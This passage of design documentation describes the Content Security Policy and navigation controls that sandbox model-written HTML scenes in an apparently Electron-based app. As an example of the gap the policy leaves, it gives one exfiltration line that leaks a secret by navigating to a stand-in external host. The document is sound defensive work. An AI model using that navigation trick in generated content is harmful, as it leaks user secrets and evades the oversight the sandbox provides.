...
The policy itself (`SCENE_CONTENT_SECURITY_POLICY`) starts `default-src 'none'` and the directive that matters most is **`connect-src 'none'`**: no `fetch`, no XHR, no WebSocket, no beacon, no remote font, no remote image. **A scene cannot FETCH what it is shown out.** That is the honest form of the claim: navigating the frame (`location = "https://elsewhere/?" + secret`) is a navigation, not a fetch, and the scene policy says nothing about it. Two doors outside that policy close it — the renderer's own `frame-src` bounds where a nested context may go, and `main.ts`'s `will-frame-navigate` handler refuses a subframe navigation outside the same allowlist. `script-src 'unsafe-inline'` permits the inline script the model wrote and nothing remote; `img-src data: blob:` allows pixels the host handed over. It travels twice — as the response header from `sceneDocumentStore.respond()` and as the first element in `<head>` from `buildSceneDocument` — and neither half is load bearing alone: the meta survives a blob fallback, the header survives a document whose `<head>` was mangled. `unwrapDocument` strips any `Content-Security-Policy` meta the model itself wrote, so a scene cannot relax its own policy, and drops `<base>` so relative-URL behaviour stays predictable if the policy is ever loosened.
